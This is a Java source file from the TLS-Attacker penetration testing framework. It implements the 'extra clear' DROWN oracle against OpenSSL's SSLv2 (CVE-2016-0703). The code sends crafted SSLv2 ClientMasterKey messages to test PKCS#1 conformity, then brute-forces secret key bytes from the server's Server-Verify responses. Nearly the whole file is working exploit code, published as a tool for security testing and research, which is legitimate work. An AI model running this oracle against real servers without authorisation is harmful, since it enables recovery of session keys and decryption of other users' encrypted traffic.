/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsattacker.attacks.pkcs1.oracles;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.attacks.exception.AttackFailedException;
import de.rub.nds.tlsattacker.attacks.impl.drown.ServerVerifyChecker;
import de.rub.nds.tlsattacker.attacks.pkcs1.OracleException;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.constants.SSL2CipherSuite;
import de.rub.nds.tlsattacker.core.protocol.message.SSL2ClientMasterKeyMessage;
import de.rub.nds.tlsattacker.core.protocol.message.SSL2ServerVerifyMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.util.Arrays;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ExtraClearDrownOracle extends Pkcs1Oracle {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config tlsConfig;
    private final SSL2CipherSuite cipherSuite;

    /**
     * Container class for the results of connect().
     */
    private class ConnectionResult {
        public SSL2ServerVerifyMessage serverVerifyMessage;
        public State state;
    }

    public ExtraClearDrownOracle(Config tlsConfig) {
        this.tlsConfig = tlsConfig;
        cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();

        blockSize = cipherSuite.getBlockSize();
        oracleType = OracleType.DROWN_EXTRA_CLEAR;
    }

    /**
     * Checks if the given message is accepted as valid ENCRYPTED-KEY-DATA of a Client Master Key message in an SSLv2
     * handshake. This is based on the "extra clear" oracle vulnerability in OpenSSL (CVE-2016-0703).
     *
     * @param  msg
     *             Potential RSA ciphertext to be checked
     * @return     True if the message was accepted, i.e. it is PKCS conforming
     */
    @Override
    public boolean checkPKCSConformity(byte[] msg) throws OracleException {
        // Overwrite the full key with clear-text null bytes, as described in
        // the DROWN paper
        int clearKeyLength = cipherSuite.getClearKeyByteNumber() + cipherSuite.getSecretKeyByteNumber();
        ConnectionResult conResult = connect(msg, clearKeyLength);

        numberOfQueries++;
        if (numberOfQueries % 1000 == 0) {
            LOGGER.info("Number of queries so far: {}", numberOfQueries);
        }

        if (conResult.serverVerifyMessage != null
            && ServerVerifyChecker.check(conResult.serverVerifyMessage, conResult.state.getTlsContext(), true)) {
            return true;
        }

        return false;
    }

    /**
     * Figures out one additional byte of a SECRET-KEY-DATA by brute-forcing through all possible values. This is
     * relevant for figuring out the actual plaintext value of ENCRYPTED-KEY-DATA after finding a conformant ciphertext
     * in an "extra clear" oracle DROWN attack. See section 5.1 of the DROWN paper for the general idea.
     *
     * @param  ciphertext
     *                        An RSA ciphertext representing valid ENCRYPTED-KEY-DATA
     * @param  knownPlaintext
     *                        The already known portion of SECRET-KEY-DATA, i.e. the plaintext corresponding to
     *                        `ciphertext`
     * @return                An additional byte of SECRET-KEY-DATA to be appended to `knownPlaintext`
     */
    public byte bruteForceKeyByte(byte[] ciphertext, byte[] knownPlaintext) {
        int pos = knownPlaintext.length;
        int clearKeyLength = cipherSuite.getClearKeyByteNumber() + cipherSuite.getSecretKeyByteNumber() - pos - 1;

        ConnectionResult conResult = null;
        // For unclear reasons, some connections randomly (very rarely) fail
        // with a Server-Verify message of null
        for (int i = 0; i < 5; i++) {
            conResult = connect(ciphertext, clearKeyLength);
            if (conResult.serverVerifyMessage == null) {
                LOGGER.warn("Invalid Server-Verify message when brute-forcing a key byte");
            } else {
                break;
            }
        }
        if (conResult.serverVerifyMessage == null) {
            throw new AttackFailedException("Too many invalid Server-Verify messages when brute-forcing a key byte");
        }

        byte[] keyCandidate = Arrays.copyOf(knownPlaintext, cipherSuite.getSecretKeyByteNumber());
        // Use ints for iteration because otherwise the loop condition will be
        // affected by wrap-arounds
        for (int b = -128; b < 128; b++) {
            keyCandidate[pos] = (byte) b;
            // ServerVerifyChecker will read the (symmetric) key from the TLS
            // context
            conResult.state.getTlsContext().setPreMasterSecret(keyCandidate);

            if (ServerVerifyChecker.check(conResult.serverVerifyMessage, conResult.state.getTlsContext(), true)) {
                return (byte) b;
            }
        }

        throw new AttackFailedException("Could not find key byte through brute-force");
    }

    private ConnectionResult connect(byte[] encryptedKey, int clearKeyLength) {
        ConnectionResult result = new ConnectionResult();
        SSL2ClientMasterKeyMessage clientMasterKeyMessage = new SSL2ClientMasterKeyMessage();

        byte[] clearKey = new byte[clearKeyLength];
        ModifiableByteArray clearKeyData = new ModifiableByteArray();
        clearKeyData.setModification(ByteArrayModificationFactory.explicitValue(clearKey));
        clientMasterKeyMessage.setClearKeyData(clearKeyData);

        // Use the target message as encrypted key data
        ModifiableByteArray encryptedKeyData = new ModifiableByteArray();
        encryptedKeyData.setModification(ByteArrayModificationFactory.explicitValue(encryptedKey));
        clientMasterKeyMessage.setEncryptedKeyData(encryptedKeyData);

        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
        trace.addTlsAction(new SendAction(clientMasterKeyMessage));
        trace.addTlsAction(new ReceiveAction(new SSL2ServerVerifyMessage()));
        result.state = new State(tlsConfig, trace);

        WorkflowExecutor workflowExecutor =
            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), result.state);
        workflowExecutor.executeWorkflow();
        result.serverVerifyMessage = (SSL2ServerVerifyMessage) WorkflowTraceUtil
            .getFirstReceivedMessage(HandshakeMessageType.SSL2_SERVER_VERIFY, trace);

        return result;
    }

}
